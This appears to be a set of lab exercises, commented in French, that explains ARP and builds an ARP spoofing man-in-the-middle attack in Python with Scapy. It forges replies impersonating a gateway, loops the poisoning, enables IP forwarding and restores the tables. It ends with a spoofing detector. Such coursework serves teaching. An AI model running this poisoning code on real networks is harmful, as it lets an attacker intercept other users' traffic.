# Ex 1

# ARP se situe entre la couche 2 (Ethernet) et la couche 3 (IP)

# IP sert à identifier logiquement une machine
# Ethernet (MAC) sert à livrer physiquement sur le réseau local

# ARP fait la traduction :
# IP → MAC

# Exemple :
# Pour envoyer vers 192.168.56.20,
# le PC doit d'abord connaître sa MAC via ARP

# Ex 2

# op :
#   1 = ARP Request
#   2 = ARP Reply

# psrc :
#   IP source (celle qu’on prétend être)

# pdst :
#   IP cible (la victime)

# hwsrc :
#   MAC source réelle (MAC de l’attaquant)

# hwdst :
#   MAC destination (machine cible)

# ARP Reply forgé :
# psrc = IP usurpée (ex: gateway)
# hwsrc = MAC attaquant


# Ex 3

# pip install scapy

from scapy.all import ARP, Ether

print("scapy OK")

# sudo requis pour envoi de paquets bruts
# sudo python3 script.py


# Ex 4

from scapy.all import ARP, Ether

arp = ARP(op=1, pdst="192.168.56.20")

frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp

frame.summary()
frame.show()




# Ex 5

from scapy.all import ARP, Ether, srp

def get_mac(ip):

    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    answered, _ = srp(packet, timeout=2, retry=2, verbose=False)

    if answered:
        return answered[0][1].hwsrc

    return None


# Ex 6

# send()
# → couche 3 (IP)

# sendp()
# → couche 2 (Ethernet)

# ARP = couche 2 → sendp obligatoire


# Ex 7

from scapy.all import ARP, Ether

def forge_reply(target_ip, target_mac, spoof_ip):

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    packet.show()
    return packet




# Ex 8

from scapy.all import sendp

def spoof_once(packet):

    sendp(packet, count=1, verbose=False)




# Ex 9

from scapy.all import ARP, Ether, sendp

def restore(dest_ip, src_ip, dest_mac, src_mac):

    packet = Ether(dst=dest_mac) / ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )

    sendp(packet, count=5, verbose=False)





# Ex 10

import time

def loop_spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, spoof):

    for i in range(3):

        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)

        time.sleep(1)







# Ex 11

def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def disable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")




# Ex 12

from scapy.all import sniff, ARP

table = {}

def detect(pkt):

    if pkt.haslayer(ARP) and pkt[ARP].op == 2:

        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc

        if ip in table and table[ip] != mac:

            print("[ALERTE] ARP spoofing détecté !")
            print("IP :", ip)
            print("Ancien MAC :", table[ip])
            print("Nouveau MAC :", mac)

        else:
            table[ip] = mac

sniff(filter="arp", prn=detect, store=False)